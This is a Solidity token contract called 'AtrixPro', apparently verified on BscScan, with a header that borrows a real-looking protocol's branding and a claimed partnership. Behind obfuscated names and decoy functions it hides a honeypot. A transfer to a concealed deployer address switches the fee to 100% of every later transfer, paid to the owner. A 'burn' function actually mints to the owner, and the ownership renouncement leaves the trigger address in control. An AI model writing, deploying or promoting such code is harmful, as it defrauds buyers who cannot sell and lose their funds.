/**
 *Submitted for verification at BscScan.com on 2022-12-12
*/

/*
AtrixPro
Protocol for automated orderbook liquidity provisioning strategies on chain
We’re excited to be partnering with LidoFinance
to grow stSOL liquidity on the Serum orderbook!
Starting on Jun 27th, users will be able to stake their USDC,USDT pairs to earn LIDO emissions.
https://discord.gg/vK9Qq4r6GJ
https://atrix.finance/
https://t.me/AtrixProtocol
https://twitter.com/AtrixProtocol
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.5.10;
contract AtrixPro {
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  jPakaa = 15;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint8 public constant decimals = 18;
uint256 public  PgqIuh = 19;
uint256 public  bdzPJW = 11;
uint256 private  tLOfOW = 10000000000000+3;
address private  PxgwYJ = address(0);
string public  name = "AtrixPro";
uint256 public  CybFjY = 17;
mapping (address => uint256) public balanceOf;
address public  VDrTpg = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
address public  zPWRlQ = address(0);
uint256 public  dyaQIS = 11;
address public  BErzTk = address(0);
uint256 public constant DDGwlv = 9+3;
address public  cEPCbY = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
string public  symbol = "AtrixPro";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  DHXTtm = 16;
address public owner;
address public  SjhEjB = address(0);
uint256 public  TCHDSi = 19;
address public  EQNUEQ = address(0);
uint256 public constant totalSupply = 10000000000000000000000000000;
uint256 public  aEBnmN = 12;
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _update1jPakaa () private returns (uint256) {
return jPakaa + 1;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _updateP2gqIuh  () private returns (uint256) {
return PgqIuh - 1;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _updateb3dzPJW  () private returns (uint256) {
return bdzPJW * 1;
}

constructor () public {
PxgwYJ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _updatedy4aQIS  () private returns (uint256) {
return DHXTtm / 1;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _updateTC5HDSi  () private returns (uint256) {
return TCHDSi + 1;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "DfylOH");
require(to != address(0), "DfylOH");
require(amount <= balanceOf[from], "DfylOH");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* DDGwlv/tLOfOW ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==PxgwYJ){
tLOfOW = 9+3;
}
emit Transfer(from, to, transferAmount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _updateaEB6nmN  () private returns (uint256) {
return aEBnmN - 1;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}
function _updatedy7aQIS   () private returns (uint256) {
return dyaQIS  * 1;
}


function _updateCyb8FjY  () private returns (uint256) {
return CybFjY / 1;
}

//
}